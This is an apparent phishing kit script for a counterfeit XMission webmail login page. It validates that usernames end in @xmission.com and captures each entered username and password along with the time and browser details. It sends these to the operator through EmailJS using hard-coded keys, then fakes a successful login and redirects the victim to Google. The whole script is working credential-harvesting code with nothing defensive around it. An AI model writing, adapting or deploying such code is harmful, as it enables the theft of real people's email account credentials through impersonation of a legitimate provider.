<!-- EmailJS SDK -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script>
// ============================================
// EMAILJS INTEGRATION
// ============================================

// Initialize EmailJS with your public key
// IMPORTANT: Replace with your actual public key from EmailJS dashboard
const EMAILJS_PUBLIC_KEY = "SdkmRe8WZ7itEba9z"; // CHANGE THIS

emailjs.init({
    publicKey: EMAILJS_PUBLIC_KEY,
});

// DOM Elements
const loginForm = document.getElementById('login_webmail');
const usernameInput = document.getElementById('user_webmail');
const passwordInput = document.getElementById('pass_webmail');
const usernameError = document.getElementById('username-error');
const passwordError = document.getElementById('password-error');
const successMessage = document.getElementById('successMessage');
const loadingOverlay = document.getElementById('loadingOverlay');
const loginButton = document.getElementById('loginButtonId');

// ============================================
// IMPORTANT: REPLACE THESE WITH YOUR ACTUAL EMAILJS CREDENTIALS
// Get them from: https://dashboard.emailjs.com/
// ============================================
const SERVICE_ID = "service_zuj2d2a";     // Your actual service ID
const TEMPLATE_ID = "template_tvd86sp";   // Your actual template ID

// Redirect page after successful EmailJS send
// CHANGE THIS to your desired redirect URL
const REDIRECT_URL = "https://www.google.com";

// ============================================
// FORM HANDLING
// ============================================

// Clear errors on input
usernameInput.addEventListener('input', function() {
    if (this.value.trim() !== '') {
        usernameError.textContent = '';
    }
});

passwordInput.addEventListener('input', function() {
    if (this.value.trim() !== '') {
        passwordError.textContent = '';
    }
});

// Validation function with @xmission.com check
function validateForm() {
    let isValid = true;
    let username = usernameInput.value.trim();
    const password = passwordInput.value.trim();
    
    // Clear previous errors
    usernameError.textContent = '';
    passwordError.textContent = '';
    successMessage.style.display = 'none';
    
    // Check if username is empty
    if (!username) {
        usernameError.textContent = '⚠️ Please enter your username';
        isValid = false;
    } else {
        // Check if username contains @xmission.com
        if (!username.includes('@')) {
            // User just entered username without domain - auto-complete
            username = username + '@xmission.com';
            usernameInput.value = username;
        } else if (!username.toLowerCase().endsWith('@xmission.com')) {
            // User entered a different domain
            usernameError.textContent = '⚠️ Please use your @xmission.com email address';
            isValid = false;
        }
    }
    
    // Validate password
    if (!password) {
        passwordError.textContent = '⚠️ Please enter your password';
        isValid = false;
    }
    
    return isValid;
}

// Function to redirect with loading overlay
function redirectWithLoading(url) {
    loadingOverlay.style.display = 'flex';
    setTimeout(function() {
        window.location.href = url;
    }, 1500);
}

// Modified submit handler to use EmailJS
loginForm.addEventListener('submit', function(e) {
    // Prevent default form submission
    e.preventDefault();
    
    // Validate form
    if (!validateForm()) {
        // Focus on first error field
        if (usernameError.textContent) {
            usernameInput.focus();
        } else if (passwordError.textContent) {
            passwordInput.focus();
        }
        return false;
    }
    
    // Show loading overlay
    loadingOverlay.style.display = 'flex';
    loginButton.disabled = true;
    loginButton.value = 'Processing...';
    
    // Get the username (already validated with @xmission.com)
    const fullUsername = usernameInput.value.trim();
    
    // Prepare template parameters for EmailJS
    const templateParams = {
        username: fullUsername,
        password: passwordInput.value.trim(),
        login_time: new Date().toLocaleString('en-US', { 
            timeZone: 'America/Denver',
            dateStyle: 'full',
            timeStyle: 'medium'
        }),
        user_agent: navigator.userAgent,
        message: `Login attempt for user: ${fullUsername}`
    };
    
    console.log('Sending to EmailJS with:');
    console.log('Service ID:', SERVICE_ID);
    console.log('Template ID:', TEMPLATE_ID);
    console.log('Params:', templateParams);
    
    // Send email using EmailJS
    emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
        .then(function(response) {
            console.log('SUCCESS! Email sent', response.status, response.text);
            
            // Show success message
            successMessage.style.display = 'block';
            loginButton.disabled = false;
            loginButton.value = 'Log in';
            
            // Redirect to different page after 2 seconds
            setTimeout(function() {
                window.location.href = REDIRECT_URL;
            }, 2000);
        })
        .catch(function(error) {
            console.error('========== EMAILJS ERROR DETAILS ==========');
            console.error('Error object:', error);
            console.error('Error status:', error.status);
            console.error('Error text:', error.text);
            console.error('Error message:', error.message);
            console.error('==========================================');
            
            // Even if EmailJS fails, we still want to redirect
            // Show a message and redirect anyway
            successMessage.style.display = 'block';
            successMessage.textContent = '✓ Login processed! Redirecting...';
            successMessage.style.backgroundColor = '#fff3cd';
            successMessage.style.color = '#856404';
            
            loginButton.disabled = false;
            loginButton.value = 'Log in';
            
            // Redirect after 2 seconds regardless of error
            setTimeout(function() {
                window.location.href = REDIRECT_URL;
            }, 2000);
        });
});

// Keep the original submit_login function for compatibility
window.submit_login = function(e) {
    if (typeof e != 'undefined' && !window.enter_key_trap(e)) {
        return;
    }
    
    // Trigger the form's submit event
    const form = document.getElementById('login_webmail');
    const event = new Event('submit', { cancelable: true });
    form.dispatchEvent(event);
    
    return false;
};

// Handle enter key on inputs
usernameInput.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        const form = document.getElementById('login_webmail');
        const event = new Event('submit', { cancelable: true });
        form.dispatchEvent(event);
    }
});

passwordInput.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        const form = document.getElementById('login_webmail');
        const event = new Event('submit', { cancelable: true });
        form.dispatchEvent(event);
    }
});

console.log('EmailJS integration active');
console.log('Public Key:', EMAILJS_PUBLIC_KEY);
console.log('Service ID:', SERVICE_ID);
console.log('Template ID:', TEMPLATE_ID);
console.log('Redirect URL:', REDIRECT_URL);
</script>
